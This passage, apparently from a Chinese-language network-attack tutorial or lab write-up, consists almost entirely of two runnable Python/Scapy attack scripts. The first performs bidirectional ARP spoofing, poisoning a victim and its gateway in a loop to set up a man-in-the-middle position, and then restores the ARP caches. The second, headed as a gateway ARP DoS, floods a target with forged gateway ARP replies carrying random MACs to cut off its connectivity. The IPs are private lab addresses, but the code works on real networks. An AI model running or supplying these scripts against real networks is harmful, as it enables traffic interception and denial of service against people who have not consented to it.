    iface = conf.iface  # 默认接口
def get_mac(ip):
    """发送ARP请求，获取目标MAC"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        retry=2,
        iface=iface,
        verbose=False
    )
    for s, r in ans:
        return r[Ether].src
    return None
def spoof(target_ip, spoof_ip):
    """伪造ARP响应，欺骗 target_ip，让其认为 spoof_ip 对应本机MAC"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] 未能解析 {target_ip} 的MAC地址，使用广播发送。")
        dst_mac = "ff:ff:ff:ff:ff:ff"
    else:
        dst_mac = target_mac
    packet = Ether(dst=dst_mac) / ARP(
        op=2,               # ARP reply
        pdst=target_ip,     # 欺骗目标 IP
        psrc=spoof_ip,      # 冒充的 IP
        hwdst=dst_mac       # 目标 MAC
    )
    sendp(packet, iface=iface, verbose=False)
def restore(dest_ip, src_ip):
    """恢复ARP缓存"""
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac and src_mac:
        packet = Ether(dst=dest_mac) / ARP(
            op=2,
            pdst=dest_ip,
            psrc=src_ip,
            hwsrc=src_mac,
            hwdst=dest_mac
        )
        sendp(packet, iface=iface, count=5, verbose=False)
try:
    attacker_ip = conf.route.route("0.0.0.0")[1]
    attacker_mac = get_mac(attacker_ip)
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    print("=== ARP 双向欺骗启动 ===")
    print(f"[+] 使用网卡接口: {iface}")
    print(f"[+] 攻击机 IP: {attacker_ip}")
    print(f"[+] 攻击机 MAC: {attacker_mac}")
    print(f"[+] 受害机 IP: {victim_ip}")
    print(f"[+] 受害机 MAC: {victim_mac}")
    print(f"[+] 网关 IP: {gateway_ip}")
    print(f"[+] 网关 MAC: {gateway_mac}")
    print("\n[*] 开始双向ARP欺骗（受害机 与 网关）...\n")
    count = 0
    while True:
        # 欺骗受害机，让它以为攻击机是网关
        spoof(victim_ip, gateway_ip)
        # 欺骗网关，让它以为攻击机是受害机
        spoof(gateway_ip, victim_ip)
        count += 1
        print(f"[{count}] 已发送双向ARP包：伪装 {gateway_ip}→{victim_ip} 与 {victim_ip}→{gateway_ip}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] 停止欺骗，正在恢复ARP表...")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
    print("[*] 网络恢复完成。")

三、网关ARP Dos
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list
import random
import time
target_ip = "192.168.73.12"  # 攻击目标（被刷ARP缓存的主机）
# 自动检测可用接口
iface = None
for i in get_if_list():
    if "VMnet" in i or "Ethernet" in i or "eth" in i:
        iface = i
        break
if not iface:
    iface = conf.iface
def get_mac(ip):
    """发送ARP请求，获取目标MAC"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        retry=2,
        iface=iface,
        verbose=False
    )
    for s, r in ans:
        return r[Ether].src
    return None
gateway_ip = "192.168.73.79"
def arp_dos(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[!] 无法获取目标MAC")
        return
    count = 0
    print("=== ARP 网关拒绝服务攻击启动 ===")
    print(f"[+] 目标主机: {target_ip}")
    print(f"[+] 攻击网关: {gateway_ip}")
    print(f"[+] 使用接口: {iface}\n")
    while True:
        fake_mac = "02:00:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            psrc=gateway_ip,   # 网关 IP
            hwsrc=fake_mac,    #  假 MAC
            hwdst=target_mac
        )
        sendp(pkt, iface=iface, verbose=False)
        count += 1
        print(f"[{count}] 伪造网关ARP → {gateway_ip} is-at {fake_mac}")
        time.sleep(1)
try:
    arp_dos(target_ip,gateway_ip)
except KeyboardInterrupt:
    print("\n[!] 用户中止攻击。ARP DoS 停止。")

